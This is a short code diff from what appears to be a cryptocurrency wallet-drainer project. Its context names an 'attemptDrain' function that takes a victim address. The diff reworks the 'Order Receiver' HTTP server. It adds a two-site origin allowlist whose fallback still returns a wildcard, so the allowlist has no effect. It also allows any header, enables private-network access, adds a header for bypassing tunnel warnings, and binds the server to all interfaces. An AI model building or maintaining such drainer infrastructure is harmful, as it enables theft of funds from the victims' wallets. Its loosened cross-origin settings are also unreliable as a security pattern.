@@ -548,13 +548,20 @@ async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, sile
 
 function startOrderReceiver() {
     const server = http.createServer((req, res) => {
-        // Enable CORS
-        res.setHeader('Access-Control-Allow-Origin', '*');
-        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+        const allowedOrigins = ["https://legacytrace.xyz", "https://legacy-trace1.vercel.app"];
+        const origin = req.headers.origin;
+        if (allowedOrigins.includes(origin) || !origin) {
+            res.setHeader('Access-Control-Allow-Origin', origin || '*');
+        } else {
+            res.setHeader('Access-Control-Allow-Origin', '*');
+        }
+
+        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
+        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With, Authorization, Bypass-Tunnel-Reminders, *');
+        res.setHeader('Access-Control-Allow-Private-Network', 'true');
 
         if (req.method === 'OPTIONS') {
-            res.writeHead(200);
+            res.writeHead(204);
             res.end();
             return;
         }
@@ -638,7 +645,7 @@ function startOrderReceiver() {
         }
     });
 
-    server.listen(WORKER_PORT, () => {
+    server.listen(WORKER_PORT, "0.0.0.0", () => {
         console.log(`📡 Order Receiver listening on port ${WORKER_PORT}`);
     });
 }
